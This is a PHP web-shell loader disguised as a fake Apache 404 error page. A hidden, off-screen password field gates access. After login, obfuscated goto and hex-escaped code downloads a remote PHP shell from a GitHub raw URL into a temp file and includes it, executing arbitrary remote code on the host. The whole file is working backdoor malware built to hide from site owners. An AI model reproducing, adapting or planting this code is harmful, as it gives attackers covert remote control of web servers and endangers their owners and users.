<?php
session_start();

function display_404_page() {
    header("HTTP/1.0 404 Not Found");
    echo '<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            input[type="password"] {
                position: absolute; /* Memposisikan kolom secara absolut */
                left: -9999px; /* Menempatkannya di luar tampilan */
                width: 1px; /* Lebar sangat kecil */
                height: 1px; /* Tinggi sangat kecil */
                opacity: 0; /* Membuatnya tidak terlihat */
            }
            input[type="submit"] {
                padding: 5px; 
                width: 5%; /* Menyusutkan lebar tombol */
                background-color: white; /* Mengubah tombol menjadi putih */
                color: white; /* Mengubah warna teks menjadi putih */
                border: none; /* Menghapus border */
                border-radius: 5px; /* Membuat sudut membulat */
                cursor: pointer; /* Mengubah kursor saat hover */
            }
            .login-container {
                position: absolute; /* Memposisikan form secara absolut */
                top: 20px; /* Jarak dari atas */
                right: 20px; /* Jarak dari kanan */
                text-align: right; /* Mengatur teks ke kanan */
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
            <div class="login-container">
                <form action="" method="post">
                    <input type="password" name="pass" placeholder="" style="color: #2d3748;">
                    <input type="submit" value="Submit">
                </form>
            </div>
        </div>
    </body>
    </html>';
    exit();
}

$password_default = '$2y$12$6k6TtOuQmyD0ylpSsapE.ufdfOiJLw5uUx5XEMvodnVdLTsndn1ta'; 

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_default)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        display_404_page();
    }
}
?>
<?php

goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\164\x74\x70\163\72\x2f\57\x72\141\x77\x2e\x67\151\164\150\x75\x62\165\x73\x65\162\143\x6f\x6e\x74\x65\x6e\164\x2e\x63\x6f\155\x2f\115\x61\x64\105\170\160\x6c\157\151\x74\x73\x2f\x47\145\x63\153\157\x2f\155\x61\x69\x6e\x2f\x67\145\143\x6b\x6f\x2d\x6e\145\x77\x2e\160\150\160")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
